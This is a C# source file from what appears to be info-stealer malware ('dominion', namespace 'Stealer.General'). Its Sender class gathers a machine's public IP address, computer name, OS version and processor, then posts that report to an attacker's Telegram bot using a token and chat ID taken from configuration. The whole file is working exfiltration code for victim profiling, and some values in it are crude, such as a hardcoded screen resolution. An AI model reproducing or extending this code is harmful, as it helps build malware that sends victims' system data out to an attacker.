using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Net;
using dominion.src.dominion.configuration;

namespace dominion.src.dominion.Stealer.General
{
    public class Sender : IDisposable
    {
        private readonly HttpClient _httpClient = new HttpClient();

        public async Task SendHelloMessage()
        {
            var url = $"https://api.telegram.org/bot{configuration.Configuration.TelegramBotToken}/sendMessage";
            
            var systemInfo = GetSystemInfo();
            
            var payload = new
            {
                chat_id = configuration.Configuration.TelegramChatId,
                text = systemInfo
            };

            var json = JsonSerializer.Serialize(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");

            await _httpClient.PostAsync(url, content);
        }

        private string GetSystemInfo()
        {
            var ipAddress = GetPublicIP();
            var computerName = Environment.MachineName;
            var osVersion = Environment.OSVersion.ToString();
            var processor = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER") ?? "Unknown";
            var ram = $"{GC.GetTotalMemory(false) / (1024 * 1024)} MB";
            var screenRes = "1920x1080";

            return $"Information Report\nIP Address: {ipAddress}\nComputer Name: {computerName}\nOperating System: {osVersion}\nProcessor: {processor}\nRAM: {ram}\nScreen Resolution: {screenRes}";
        }

        private string GetPublicIP()
        {
            try
            {
                using (var client = new WebClient())
                {
                    return client.DownloadString("https://api.ipify.org").Trim();
                }
            }
            catch
            {
                return "Unknown";
            }
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }
}